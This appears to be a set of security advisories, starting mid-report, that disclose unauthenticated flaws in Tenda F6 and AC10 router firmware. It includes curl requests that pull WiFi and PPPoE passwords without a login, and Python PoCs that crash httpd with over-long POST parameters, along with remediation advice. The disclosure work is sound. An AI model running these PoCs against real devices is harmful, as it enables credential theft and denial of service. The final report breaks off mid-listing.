- The front-end JavaScript confirms the data flow: the `getStatus` request (offset 0x217356) asks for `modules="internetStatus,deviceStatistics,systemInfo,wanAdvCfg,wifiRelay,wifiBasicCfg,sysTime"`; the `getWifi` request (offset 0x209600) includes the `wifiBasicCfg` module (contains `wifiPwd`); the `getWAN` payload (offset 0x204B22) contains `wanPPPoEUser` and `wanPPPoEPwd`; `getQos` returns `onlineList` with all online devices' MAC/IP addresses.
- Root cause: the whitelist of `TWL300NWebsSecurityByCookieHandler` is too broad — pages that genuinely need pre-auth access (login page, setup wizard) sit in the same whitelist as GET endpoints returning sensitive configuration. Correct design would exempt only the login page and static resources and force authentication for all sensitive goform interfaces.

## Exploitation

Preconditions:

- Network access to the router's web service (LAN side, or WAN side when remote web management is enabled). No credentials, no cookie, no session.

Steps:

1. Extract the firmware from the ZIP and verify hashes (MD5 `087e8d0b701caf1499e50a87b5bd333d`, SHA256 `e77fd5e3...`); binwalk-extract the LZMA payload at offset 0x2834 and confirm the embedded identity strings `Product: Tenda F6V5.0`, `Version: V12.02.01.64`.
2. Static verification (`repro-driver.py`): load the decompressed eCos binary, locate `TWL300NWebsSecurityByCookieHandler` at offset 0x18f49c, dump the auth-bypass whitelist and confirm the 5 sensitive endpoints are exempt from authentication:

```
[+] TWL300NWebsSecurityByCookieHandler at offset 0x18f49c
[*] Checking 5 sensitive endpoints:
    [VULN] /goform/getWifi → WiFi password (wifiPwd), SSID
    [VULN] /goform/getStatus → WiFi config, system info
    [VULN] /goform/getWAN → PPPoE username/password
    [VULN] /goform/getSysTools → Login auth info
    [VULN] /goform/getQos → Online device list
VERDICT SUCCESS — 5 sensitive endpoints bypass authentication
```

3. Against a real device (default 192.168.0.1), request the endpoints without any cookie:

```http
GET /goform/getWifi?modules=wifiEn,wifiBasicCfg,wifiAdvCfg,wifiPower,wifiTime,wifiWPS HTTP/1.1
Host: 192.168.0.1
```

```bash
curl -m 5 'http://192.168.0.1/goform/getWifi?modules=wifiBasicCfg'
```

The response JSON contains the `wifiPwd` field — the WiFi password in cleartext. The same applies to `getWAN` (PPPoE credentials), `getQos` (device list) and the other endpoints listed above.

Note: this firmware is a Realtek eCos RTOS monolithic image (not a Linux filesystem), so QEMU/FirmAE system-level emulation is not available; the package verifies the vulnerability through binary static analysis (`repro-driver.py`) plus a network PoC script (`poc_info_disclosure.py`) for real devices.

## Evidence

![Firmware verification and extraction: MD5/SHA256 matched, LZMA payload at 0x2834 decompressed, version strings confirm Tenda F6V5.0 V12.02.01.64](F6_images/fig1.png)

![repro-driver.py output: auth handler located, full auth-bypass whitelist dumped, 5 sensitive endpoints flagged VULN, cookie password format shown, VERDICT SUCCESS](F6_images/fig2.png)

Supporting text evidence from the package:

- `info-disclosure-repro.transcript` — full `repro-driver.py` output quoted above with `VERDICT SUCCESS — 5 sensitive endpoints bypass authentication`.
- `code_location.txt` — file offsets of the whitelist entries, sensitive parameter names and the cookie password format string.

## Impact

An unauthenticated attacker with reachability to the web service can retrieve:

- The WiFi password in cleartext (`wifiPwd`), enabling unauthorized association with the wireless network.
- PPPoE ISP username and password (`wanPPPoEUser` / `wanPPPoEPwd`), leaking the subscriber's internet credentials.
- Login authentication status info (`loginAuth`, `hasLoginPwd`) which assists follow-up attacks on the management interface.
- The complete online device list with MAC and IP addresses (`onlineList`), enabling network reconnaissance and targeted attacks.

Additionally, the password is stored base64-encoded inside the `ecos_pw` cookie, so any cookie theft directly reveals the management password.

## Remediation Suggestions

1. Fix the authentication whitelist: remove `/goform/getWifi`, `/goform/getStatus`, `/goform/getWAN`, `/goform/getSysTools`, `/goform/getQos` and similar sensitive-data endpoints from the `TWL300NWebsSecurityByCookieHandler` exemption list; keep only the login page (`/login.html`) and necessary static resources exempt.
2. Minimize wizard interface data: if `/goform/getWizard` must stay pre-auth accessible for initial setup, restrict its response scope so it never returns sensitive fields such as `wifiPwd`, or exempt it only while no password has been set (first-time configuration).
3. Harden password storage: replace the base64-encoded password in the `ecos_pw` cookie with a secure session-token mechanism so the password cannot be recovered from the cookie.
4. Unified access control: apply default-deny authentication to all `/goform/` interfaces and exempt only the minimal required set (e.g. the login verification endpoint).
5. Enable HTTPS on the web management interface to protect sensitive data in transit.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/F6/US_F6V5.0re_V12.02.01.64_cn_TDC01.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda AC10 V16.03.10.13: httpd setMacFilterCfg deviceList Stack Buffer Overflow (Unauthenticated, Remote DoS)
content:
# Tenda AC10 V16.03.10.13: httpd setMacFilterCfg deviceList Stack Buffer Overflow (Unauthenticated, Remote DoS)

## Vulnerability Type / CWE

- Stack buffer overflow (CWE-121)
- Reachable without authentication; verified impact is remote denial of service (httpd SIGSEGV), and the overflow additionally yields an attacker-controlled arbitrary-address write primitive with potential for further exploitation

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda (Shenzhen Jixiang Tenda Technology Co., Ltd.) |
| Product | AC10 V4 wireless router |
| Model | AC10 V4 |
| Firmware filename & version | US_AC10V4.0si_V16.03.10.13_cn_TDC01.bin (fireversion=ac10v4_V16.03.10.13(499)_cn) |
| Severity | High (CVSS v3.1 reference estimate 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H; would rise to critical if the write primitive is escalated to code execution) |
| Component | httpd web service (`/bin/httpd`, MD5 `2a525991cc7612c98766cd1a9775cef2`, 1046972 bytes, musl libc, MIPS32 little-endian), function `formSetMacFilterCfg` @ 0x0047a51c, handler of the `/goform/setMacFilterCfg` endpoint; vulnerable parameter `deviceList` (with `macFilterType`) |

Firmware MD5: `e7c7323f5ae319b23476eb22a56179bb` (package `AC10v4升级软件 V16.03.10.13.zip`, MD5 `0b64e056c7b1785e77998100997bf111`; SquashFS XZ at firmware offset 0x1F23EC)

## Vulnerability Description

The httpd service of Tenda AC10 V4 firmware V16.03.10.13 has a stack buffer overflow when processing the `/goform/setMacFilterCfg` endpoint, handled by `formSetMacFilterCfg` (address 0x0047a51c) with an 800-byte (0x320) stack frame, return address `ra` saved at `sp+0x31c`.

The business format of `deviceList` is a list of "device name \r MAC address" entries. The function fetches it via `websGetVar`, splits it on the carriage-return character `\r` with `strtok`, and copies each segment with `strcpy` into fixed stack buffers — two 256-byte buffers zeroed by `memset` at entry, located at `fp+0xb4` and `fp+0x1b4`. `strcpy` performs no capacity check, so a single over-long segment keeps writing toward higher stack addresses: past the 256-byte boundary, past the saved `fp`/`ra` of `formSetMacFilterCfg`, and into the caller's stack frame.

GDB-based crash forensics in this audit pinned down the exact mechanism: the crash does not simply hijack `$ra` on return — the overflow first corrupts a local variable in the caller's frame. After `formSetMacFilterCfg` returns, the caller executes `lw v0, 0x21c(fp)` at 0x0047c5a0 to load the destination pointer of a structure copy — that slot now holds overflow data — and then performs a series of field-by-field stores starting at 0x0047c5c4 (`swl t2,3(v0)`, `swr t2,0(v0)`, ...). If the pointer is invalid the process immediately SIGSEGVs; if the attacker replaces those four bytes with a writable address, the stores succeed, writing attacker-specified data to an attacker-specified address.

The endpoint requires no authentication and no session. All three of the following conditions must hold to trigger the crash:

1. `macFilterType` present and non-empty (`black` and `white` both work; empty or omitted does not trigger).
2. `deviceList` contains at least one `\r` separator (only `\n` does not trigger; a single over-long value with no separator does not trigger either).
3. At least one segment is ≥ 436 bytes — measured precisely by binary search: 435 bytes leaves the service alive, 436 bytes crashes it.

## Root Cause Analysis

- Handler registration: `formDefineTendDa` maps `/goform/setMacFilterCfg` to `formSetMacFilterCfg` (0x0047a51c) via `websFormDefine`.
- Prologue:

```
0x0047a528    addiu sp, sp, -0x320    ; 800-byte stack frame
0x0047a52c    sw    ra, 0x31c(sp)     ; return address
0x0047a530    sw    fp, 0x318(sp)     ; previous frame pointer
0x0047a534    move  fp, sp
```

- Destination buffers: two 256-byte buffers zeroed at entry:

```
0x0047a5d4    addiu v0, fp, 0xb4      ; memset(v0, 0, 0x100)
0x0047a600    addiu v0, fp, 0x1b4     ; memset(v0, 0, 0x100)
```

- Input fetch: `websGetVar(wp, "deviceList", ...)` at 0x0047a658, result pointer saved at `fp+0x24`.
- Overflow: each `\r`-separated segment of `deviceList` is copied by `strcpy` into the 256-byte stack buffer with no bounds check.
- Crash chain (GDB-verified): overflow in `formSetMacFilterCfg` → return to caller → `0x0047c5a0 lw v0, 0x21c(fp)` loads the corrupted destination pointer → `0x0047c5a4 lw t2, 0x34(fp)` loads the data → `0x0047c5c4 swl t2,3(v0)` faults when `v0` points to an inaccessible address.

## Exploitation

Preconditions:

- Access to the router's LAN-side web service (same broadcast domain, or a host connected via Wi-Fi/cable). No credentials required.

Steps (reproduction used QEMU user-mode + chroot of the extracted rootfs in WSL2, with `/dev`/`/proc` bind-mounted, binwalk-modified symlinks restored, and bridge `br0` carrying 127.0.0.2/32 as the listen address):

1. Unzip the upgrade package and verify MD5 `e7c7323f5ae319b23476eb22a56179bb`; binwalk-extract the rootfs; confirm `fireversion=ac10v4_V16.03.10.13(499)_cn`.
2. Start the target:

```
webs: Listening for HTTP requests at address 127.0.0.2
httpd listen ip = 127.0.0.2 port = 80
```

3. Baseline: `GET /` returns HTTP 302.
4. Benign control request (short `deviceList`) returns 200 and httpd stays alive — proving the crash is caused by the over-long input, not the request itself:

```bash
curl -X POST http://127.0.0.2/goform/setMacFilterCfg \
  --data-urlencode "macFilterType=black" \
  --data-urlencode "deviceList=phone
BB:CC:DD:EE:FF:01"          # -> 200, httpd ALIVE
```

5. Run the PoC (form: `macFilterType=black`, `deviceList` = 2000 x "A" + "\r" + `BB:CC:DD:EE:FF:00`; the first `\r`-separated segment is far beyond the 256-byte buffer):

```bash
python3 poc_setMacFilterCfg_overflow.py 127.0.0.2
# -l 436 crashes; -l 435 leaves the service alive (threshold verified)
```

6. Result: `RESULT: connection error -> httpd crashed (DoS achieved)`, QEMU prints `Segmentation fault (core dumped)`; post-attack the process is gone, port 80 has no listener, HTTP returns 000.

Controllability verification (from the package, via gdb):

- Setting payload bytes 456-459 to `9876` makes gdb show `$v0 = 0x36373839` (ASCII "9876") at the faulting instruction — the write destination is fully attacker-controlled.
- Replacing the same four bytes with the writable address `0x407ff104` makes the store at 0x0047c5c4 succeed; reading back that address yields `0x433a4242 0x44443a43 0x3a45453a 0x303a4646` — little-endian for `BB:CC:DD:EE:FF:0` — i.e. 16 bytes of data written to the attacker-chosen address (the process still crashed later on another corrupted pointer, so the end-to-end effect in this run was denial of service).

## Evidence

![One-click repro: firmware verified (MD5 matched), rootfs extracted, symlinks restored, /dev and /proc bound, br0 configured, httpd listening on 127.0.0.2:80, pre-attack HTTP 302](AC10_images/fig1.png)

![Benign control request returns 200 with httpd alive, PoC with 2000-byte deviceList segment crashes httpd (Segmentation fault, core dumped), post-attack verification shows process DEAD and port 80 unresponsive](AC10_images/fig2.png)

Supporting text evidence from the package:

- `httpd-boot.transcript` — httpd boot log with listening confirmation via `ss -tln`.
- `vuln2-setMacFilterCfg.transcript` — full verification record: boot → pre-attack 302 → benign control 200/alive → PoC crash → post-attack no process/no listener/HTTP 000 → quantified trigger conditions (436-byte threshold, payload shape matrix, `macFilterType` influence) → gdb crash forensics → VERDICT SUCCESS.
- `code_location.txt` — address list of the vulnerable function, frame, buffers and crash point.

## Impact

An attacker with access to the LAN-side web service can crash httpd at will, and in this tested image the service does not auto-restart (the process is not supervised), producing a persistent denial of the management interface. Beyond the DoS, the overflow provides a write-what-where primitive (destination address from payload bytes 456-459, written content from the device-list segment), which can serve as a building block for control-flow hijacking and code execution in a fuller exploit chain.

## Remediation Suggestions

1. Enforce per-segment length validation in `formSetMacFilterCfg` — reject any `deviceList` segment longer than the 256-byte destination buffer, and cap the total `deviceList` length at entry.
2. Replace `strcpy` with `strncpy`/`snprintf` with explicit destination capacity and guaranteed NUL termination; also bound the number of segments to avoid cumulative overflows.
3. Compile with `-fstack-protector-all` (or at least `-fstack-protector-strong`) and `-D_FORTIFY_SOURCE=2`.
4. Enable NX and ASLR to reduce the feasibility and stability of further exploitation.
5. Enforce session and permission checks on `/goform/*` endpoints to close the unauthenticated attack surface.
6. Improve service robustness: supervise httpd with automatic restart and crash alerting to limit DoS impact.
7. Track vendor security releases and upgrade the firmware.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/AC10%20v4.0/AC10v4%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6%20V16.03.10.13.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda AC10 V16.03.10.13: httpd SetFirewallCfg firewallEn Stack Buffer Overflow (Unauthenticated, Remote DoS)
content:
# Tenda AC10 V16.03.10.13: httpd SetFirewallCfg firewallEn Stack Buffer Overflow (Unauthenticated, Remote DoS)

## Vulnerability Type / CWE

- Stack buffer overflow (CWE-121)
- Reachable without authentication over HTTP POST; demonstrated impact is remote denial of service, with attacker data controlling the dereferenced pointer value (potential remote code execution)

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda (Shenzhen Jixiang Tenda Technology Co., Ltd.) |
| Product | AC10 V4 wireless router |
| Model | AC10 V4 |
| Firmware filename & version | US_AC10V4.0si_V16.03.10.13_cn_TDC01.bin (fireversion=ac10v4_V16.03.10.13(499)_cn) |
| Severity | High |
| Component | httpd web service (`/bin/httpd`, MIPS32 ELF), function `formSetFirewallCfg` @ 0x004961b0, handler of the `/goform/SetFirewallCfg` endpoint; vulnerable parameter `firewallEn` |

Firmware MD5: `e7c7323f5ae319b23476eb22a56179bb` (upgrade package `AC10v4升级软件 V16.03.10.13.zip`, MD5 `0b64e056c7b1785e77998100997bf111`)

## Vulnerability Description

The httpd web service of Tenda AC10 V4 firmware V16.03.10.13 contains a stack buffer overflow in `formSetFirewallCfg` (address 0x004961b0), the handler of the `/goform/SetFirewallCfg` endpoint.

On a POST request, the handler fetches the `firewallEn` parameter via `websGetVar` (default value `"1111"`), performs only a `strlen >= 4` gate check, and then copies the value with `strcpy` into a small stack buffer at `fp+0x28` with no upper bound on the input length.

The `formSetFirewallCfg` stack frame is only 192 bytes (`addiu sp,sp,-0xc0`), and the return address `ra` is saved at `sp+0xbc` — only 148 bytes (0x94) above the `strcpy` destination. Any `firewallEn` value longer than 148 bytes overwrites the return address (full control of `ra` requires 152+ bytes); the overwrite also destroys a stack slot at `fp+0xc0` that the function epilogue uses to reload the `wp` request pointer. In testing, a 2000-byte payload crashed httpd with `SIGSEGV {si_addr=0x4141422d}` — a fault address composed entirely of payload bytes, proving attacker data precisely controlled the dereferenced pointer. The endpoint requires no authentication and the overflow threshold is very low.

## Root Cause Analysis

All addresses are in `extract/squashfs-root/bin/httpd` (load base 0x00400000), verified with radare2 disassembly and GOT resolution:

- Handler registration: `/goform/SetFirewallCfg` is registered via `websFormDefine` to `formSetFirewallCfg` (0x004961b0); the function pointer is recorded in GOT slot 0x005053F4. Runtime behavior confirmed the endpoint reaches this function (its unique `system()` call string is triggered, see below).
- Stack frame: `addiu sp,sp,-0xc0` at 0x004961bc (192-byte frame); `sw ra,0xbc(sp)` at 0x004961c0; `move fp,sp` at 0x004961c8. Two `memset` calls at entry zero 64-byte buffers at `fp+0x30` and `fp+0x78`.
- Input fetch: `websGetVar(wp, "firewallEn", "1111")` at 0x00496274 (parameter string at 0x004ee3f8, default at 0x004ee3f0).
- Length gate: `strlen` at 0x00496288, then `sltiu v0,v0,4` + `bnez` at 0x004962a0 skips the copy branch when `strlen < 4` (branch target 0x00496408). The default `"1111"` is exactly 4 bytes, so the copy branch is the normal path — a long payload passes unimpeded.
- Dangerous copy: `strcpy` at 0x004962c4, destination `fp+0x28`, source is the `websGetVar` return value, with no length validation. `fp+0x28` is 148 bytes below the saved `ra` slot (`fp+0xbc`).
- Non-overflow point clarified: the `sprintf(fp+0x78, "%c,1500;%c,1500;%c,1500", ...)` at 0x00496370 only formats the first 3 characters of the payload (max 24 bytes output) and does not overflow; the dangerous call is the `strcpy` above.

Crash chain (matches the measured `si_addr` bit-for-bit): the 2000-byte payload smears ~2 KB upward from `fp+0x28`. The function continues executing in a corrupted state: `setConfig("security.ddos.map", fp+0x30)`, `setConfig("firewall.pingwan", fp+0x70)`, `sprintf(fp+0x78, ...)`, `system("cfm post netctrl ddos_ip_fence?op=6")` (0x004963f4, fails in the sandbox without `/bin/sh`), then at 0x00496444 `lw a0,0xc0(fp)` loads the destroyed `wp` pointer (all-'A' payload → `wp=0x41414141`), which flows through `websTransfer_errCode` (0x00449228) → `websTransfer` (0x00449140) → `websWrite` dereferencing `wp+0xEC`. The theoretical fault address `0x41414141+0xEC = 0x4141422d` matches the qemu-measured `si_addr=0x4141422d` exactly. Even without this dereference, the epilogue `lw ra,0xbc(sp)` (0x00496468) followed by `jr ra` would jump to the overwritten `0x41414141` and crash.

## Exploitation

Preconditions:

- The router's web service is reachable over the network. No credentials are required (verified in testing: the request reaches the handler without any cookie or token).

Steps (reproduction used `chroot` + `qemu-mipsel-static` component-level replay in WSL2; a LAN bridge `br0` with 192.168.1.1/24 must exist first because httpd queries `br0`'s address via SIOCGIFADDR at startup and deadloops otherwise):

1. Unpack and verify the firmware (`bash ./extract_firmware.sh`): MD5 `e7c7323f5ae319b23476eb22a56179bb`, SquashFS at offset 2040812 with `bytes_used=5135378`, `fireversion=ac10v4_V16.03.10.13(499)_cn`.
2. Start the target (`bash ./run_emulation.sh`):

```
****** WeLoveLinux******
webs: Listening for HTTP requests at address 192.168.1.1
```

3. Pre-attack baseline: `curl http://192.168.1.1/` returns HTTP 302 — the service is healthy.
4. Send the overflow request (2000 bytes in `firewallEn`, core of `poc_SetFirewallCfg_overflow.py`):

```python
url = "http://192.168.1.1/goform/SetFirewallCfg"
data = {"firewallEn": "A" * 2000}   # 148 bytes to saved ra; 2000 also destroys the wp slot at fp+0xc0
requests.post(url, data=data, timeout=5)
```

5. Result:

```
TARGET: http://192.168.1.1/goform/SetFirewallCfg
Sending overflow payload: 2000 bytes in firewallEn parameter ...
RESULT: Connection error - httpd service crashed (DoS confirmed)
--- post-attack verification ---
httpd process: NOT FOUND (crashed, state=gone)
HTTP service check: Connection refused
qemu signal: --- SIGSEGV {si_signo=SIGSEGV, si_code=1, si_addr=0x4141422d} ---
VERDICT SUCCESS: httpd crashed due to stack buffer overflow in SetFirewallCfg, DoS confirmed
```

## Evidence

![Firmware unpacking and verification: MD5 matched, SquashFS extracted at offset 2040812, fireversion=ac10v4_V16.03.10.13(499)_cn confirmed](AC10_images/fig1.png)

![Full reproduction: pre-attack HTTP 302, PoC sending 2000-byte firewallEn, httpd crashed, SIGSEGV with fault address 0x4141422d built from payload bytes, VERDICT SUCCESS summary table](AC10_images/fig2.png)

Supporting text evidence from the package:

- `vuln4-SetFirewallCfg.transcript` — the complete verification process quoted above, ending in `VERDICT SUCCESS`.
- `httpd-boot.transcript` — httpd boot output `webs: Listening for HTTP requests at address 192.168.1.1`.
- `extract/httpd.strace.log` — full `qemu -strace` trace containing the SIGSEGV record.

## Impact

An unauthenticated attacker can crash the router's web service with a single HTTP POST request, causing a remote denial of service (the management UI becomes unreachable until the process is restarted). The fault address `0x4141422d` being composed exactly of payload bytes demonstrates that attacker data controls the dereferenced pointer and the saved return address, so with knowledge of the firmware load base the vulnerability provides conditions for remote code execution.

## Remediation Suggestions

1. Enforce a length check on the `firewallEn` parameter (e.g. at most 16 bytes) and reject over-long requests outright.
2. Replace `strcpy` with `strncpy`/`strlcpy` with an explicit buffer capacity, eliminating unbounded copies.
3. Compile with `-fstack-protector-all` so a corrupted return address aborts the process instead of being used.
4. Enable ASLR and NX to increase exploitation difficulty.
5. Add authentication checks to `/goform/` endpoints so unauthorized requests never reach the handler.
6. Upgrade the firmware to the latest version.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/AC10%20v4.0/AC10v4%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6%20V16.03.10.13.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda AC10 V16.03.10.13: httpd saveParentControlInfo urls Stack Buffer Overflow (Unauthenticated, Remote DoS)

# Tenda AC10 V16.03.10.13: httpd saveParentControlInfo urls Stack Buffer Overflow (Unauthenticated, Remote DoS)

## Vulnerability Type / CWE

- Stack-based buffer overflow (CWE-121)
- Reachable without authentication over HTTP POST; demonstrated impact is remote denial of service, with saved return address overwrite indicating potential remote code execution via a crafted ROP chain

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda (Shenzhen Jixiang Tenda Technology Co., Ltd.) |
| Product | AC10 V4 wireless router |
| Model | AC10 V4 |
| Firmware filename & version | US_AC10V4.0si_V16.03.10.13_cn_TDC01.bin (fireversion=ac10v4_V16.03.10.13(499)_cn) |
| Severity | High |
| Component | httpd web service (`/bin/httpd`), function `saveParentControlInfo` @ 0x00488998, handler of the `/goform/saveParentControlInfo` endpoint; vulnerable parameter `urls` |

Firmware MD5: `e7c7323f5ae319b23476eb22a56179bb`; SHA256: `62807982e215ebfb31b8709dd4517cb033cf98a4103f4cdd05645f9502cd5436` (MIPS32 little-endian, SquashFS)

## Vulnerability Description

The httpd web service of Tenda AC10 V4 firmware V16.03.10.13 contains a stack buffer overflow in the `saveParentControlInfo` function (binary address 0x00488998), the handler of the `/goform/saveParentControlInfo` HTTP endpoint.

When processing a POST request, the handler obtains the `urls` parameter via `websGetVar` and copies its value with `strcpy` directly into a fixed-size buffer on the stack, without any length validation or restriction. Since the length of the `urls` POST parameter is unbounded, an attacker can send arbitrarily long data.

The `saveParentControlInfo` stack frame is 824 bytes (allocated by `addiu sp,sp,-824`), with the return address `ra` saved at frame offset 820 and the frame pointer `s8` at offset 816. An oversized `urls` value makes `strcpy` write past the buffer, successively overwriting the saved `s8` (offset 816) and the return address `ra` (offset 820), hijacking the control flow on function return.

No authentication is required: an attacker who can reach the router's HTTP port 80 can crash httpd with a single POST request containing an over-long `urls` parameter, causing a denial of service. With a carefully constructed ROP chain, remote code execution is also possible.

## Root Cause Analysis

- Handler registration: static analysis of the httpd binary shows that `formDefineTendDa` (address 0x00441190) calls `websFormDefine` to map the URL path `/goform/saveParentControlInfo` to the `saveParentControlInfo` handler (address 0x00488998).
- Stack frame: the MIPS prologue allocates an 824-byte frame (`addiu sp,sp,-824` at 0x004889a4); the return address is saved with `sw ra,820(sp)` at 0x004889a8, and the frame pointer `s8` at sp+816.
- User input: the function reads several attacker-controlled parameters via `websGetVar`, including `deviceId`, `deviceName`, `enable`, `mac`, `url_enable`, `urls` (the crash parameter, fetched near address 0x004897c4), `time`, `day`, `devName` and `limit_type`.
- Overflow cause: the `urls` value is copied to the stack buffer by `strcpy` (call via GOT offset -29236) with no bounds check. Data beyond the buffer capacity is written toward higher stack addresses, overwriting local variables, the saved `s8` and `ra`.

Overflow path summary from `code_location.txt`:

```
文件: bin/httpd
函数: saveParentControlInfo (地址 0x00488998)
漏洞参数: urls (通过 websGetVar 获取)
危险调用: strcpy (将 urls 参数值复制到栈缓冲区)
栈帧大小: 824 字节 (addiu sp,sp,-824 at 0x004889a4)
返回地址偏移: ra 保存在 sp+820 (sw ra, 820(sp) at 0x004889a8)
溢出路径: websGetVar(wp, "urls", ...) -> strcpy(stack_buffer, urls_value) -> 覆盖 ra
```

## Exploitation

Preconditions:

- The router's web service (port 80) is reachable over the network. No credentials are required.

Steps (reproduction used qemu-user component-level replay of `/bin/httpd` with `-L <rootfs>` under WSL2; a LAN bridge `br0` with 192.168.1.1/24 is created first because httpd initialization blocks until `br0` is up and the firmware binds to the device's real LAN IP):

1. Extract the firmware (`extract_firmware.sh`, binwalk with `--run-as=root`) and verify `fireversion=ac10v4_V16.03.10.13(499)_cn` and the MD5 above.
2. Start the target:

```bash
bash ./run_emulation.sh
# ****** WeLoveLinux******
# webs: Listening for HTTP requests at address 192.168.1.1
# httpd listen ip = 192.168.1.1 port = 80
```

3. Control test — a benign short request must not crash httpd:

```bash
curl -s -m5 --data "deviceId=1&deviceName=test&urls=test&time=08:00-22:00&day=1,1,1,1,1,1,1&enable=1&mac=AA:BB:CC:DD:EE:FF&url_enable=1&limit_type=0&devName=test" http://192.168.1.1/goform/saveParentControlInfo
# control HTTP: 200 - httpd ALIVE after benign request (control PASS)
```

4. Run the PoC with a 2000-byte `urls` value (core of `poc_saveParentControlInfo_overflow.py`):

```python
payload = "A" * 2000
data = {
    "deviceId": "1", "deviceName": "test",
    "urls": payload,                      # 2000 bytes -> overwrites saved ra at sp+820
    "time": "08:00-22:00", "day": "1,1,1,1,1,1,1",
    "enable": "1", "mac": "AA:BB:CC:DD:EE:FF",
    "url_enable": "1", "limit_type": "0", "devName": "test",
}
requests.post("http://192.168.1.1/goform/saveParentControlInfo", data=data, timeout=5)
```

5. Result:

```
TARGET: http://192.168.1.1/goform/saveParentControlInfo
Sending overflow payload: 2000 bytes in urls parameter ...
RESULT: Connection error - httpd service down (DoS confirmed)
./run_emulation.sh: line 123: 39109 Segmentation fault (core dumped) "$QEMU" -L "$ROOTFS" "$HTTPD_BIN"
--- post-attack verification ---
post-attack httpd process : NOT FOUND (crashed)
post-attack listener      : no listener
post-attack HTTP on GET / : 000 Connection refused / no response
```

The overflow bytes (e.g. `0x41414141`) overwrite the return address; on function return the jump to the invalid address raises the segmentation fault. On a real device, roughly 820+ bytes of `urls` are enough to overwrite `ra`.

## Evidence

![Firmware verification and binwalk extraction: MD5/SHA256 matched, SquashFS located at 0x1F23EC, /bin/httpd and fireversion=ac10v4_V16.03.10.13(499)_cn confirmed](AC10_images/fig1.png)

![Full replay: httpd listening on 192.168.1.1:80, control request returns 200 with process alive, 2000-byte urls overflow causes Segmentation fault (core dumped), post-attack checks show no process and no listener](AC10_images/fig2.png)

Supporting text evidence from the package:

- `httpd-boot.transcript` — real boot of httpd under qemu-user, `httpd listen ip = 192.168.1.1 port = 80` (the `connect cfmd is error` lines are normal probing of daemons absent in component-level replay).
- `vuln1-saveParentControlInfo.transcript` — full verification: listener up and `GET /` returns 302, control test passes (HTTP 200, process alive), PoC yields `RESULT: Connection error - httpd service down (DoS confirmed)`, post-attack process `NOT FOUND (crashed)`, `Segmentation fault (core dumped)`, `VERDICT SUCCESS`.

## Impact

An unauthenticated attacker who can reach the router's HTTP port can crash the httpd web service with a single crafted POST request, resulting in a remote denial of service (management interface unavailable until the process restarts). Because the overflow overwrites the saved frame pointer and return address, the vulnerability also provides a potential path to remote code execution via a crafted ROP chain.

## Remediation Suggestions

1. Enforce input length validation on the `urls` parameter inside `saveParentControlInfo` so it cannot exceed the destination buffer (the report suggests limiting `urls` to at most 512 bytes).
2. Replace `strcpy` with bounded string functions such as `strncpy` or `snprintf`, always specifying the destination buffer capacity.
3. Enable stack protection (stack canary) when compiling httpd, e.g. GCC's `-fstack-protector-all`, to detect and abort on overflow.
4. Enable ASLR and a non-executable stack at the firmware system level to raise exploitation difficulty.
5. Implement strict authentication checks for all `/goform/` endpoints to prevent unauthenticated access to sensitive functionality.
6. Monitor vendor security advisories and upgrade to the latest fixed firmware.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/AC10%20v4.0/AC10v4%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6%20V16.03.10.13.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda AC10 V16.03.10.13: httpd openSchedWifi schedStartTime Stack Buffer Overflow (Unauthenticated, Remote DoS)
content:
# Tenda AC10 V16.03.10.13: httpd openSchedWifi schedStartTime Stack Buffer Overflow (Unauthenticated, Remote DoS)

## Vulnerability Type / CWE

- Stack buffer overflow (CWE-121)
- Reachable without authentication over HTTP; demonstrated impact is remote denial of service (SIGSEGV of the web daemon), with return-address overwrite indicating potential code execution

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda (Shenzhen Jixiang Tenda Technology Co., Ltd.) |
| Product | AC10 V4 wireless router |
| Model | AC10 V4 |
| Firmware filename & version | US_AC10V4.0si_V16.03.10.13_cn_TDC01.bin (fireversion=ac10v4_V16.03.10.13(499)_cn) |
| Severity | High |
| Component | httpd web service (`/bin/httpd`), function `setSchedWifi` @ 0x00472214, handler of the `/goform/openSchedWifi` endpoint; vulnerable parameter `schedStartTime` |

Firmware MD5: `e7c7323f5ae319b23476eb22a56179bb` (MIPS32 little-endian, SquashFS at image offset 0x1F23EC / 2040812, length 5135378)

## Vulnerability Description

The httpd web service of Tenda AC10 V4 firmware V16.03.10.13 contains a stack buffer overflow in `setSchedWifi` (address 0x00472214), the internal handler of the `/goform/openSchedWifi` goform endpoint.

When an attacker sends an HTTP POST request to `/goform/openSchedWifi`, the handler obtains the `schedStartTime` parameter via `websGetVar` and then copies its value with `strcpy` into a fixed-size buffer allocated on the stack. Because the code performs no length validation on `schedStartTime`, an attacker can send arbitrarily long data.

The `setSchedWifi` stack frame is 640 bytes (`addiu sp,sp,-0x280`), and the saved return address `ra` is stored at `sp+0x27c`. A `schedStartTime` value longer than the buffer overflows the stack, overwrites `ra`, and crashes the process with a segmentation fault on function return. The endpoint requires no authentication, so the crash can be triggered remotely by a single unauthenticated HTTP request.

## Root Cause Analysis

- Handler registration: in `formDefineTendDa`, `websFormDefine` maps `/goform/openSchedWifi` to its handler, which calls `setSchedWifi` (0x00472214).
- Stack frame: the function prologue is `addiu sp,sp,-0x280` at 0x00472220 (640-byte frame); the return address is saved with `sw ra, var_4h` at 0x00472224 (sp+0x27c).
- User input: the function reads `schedWifiEnable`, `schedStartTime` (the vulnerable parameter), `schedEndTime`, `timeType` and `day` via `websGetVar`.
- Overflow path: `websGetVar(wp, "schedStartTime", ...)` → `strcpy(stack_buf, schedStartTime)` → saved `ra` overwritten.

Overflow path summary from `code_location.txt`:

```
文件: bin/httpd
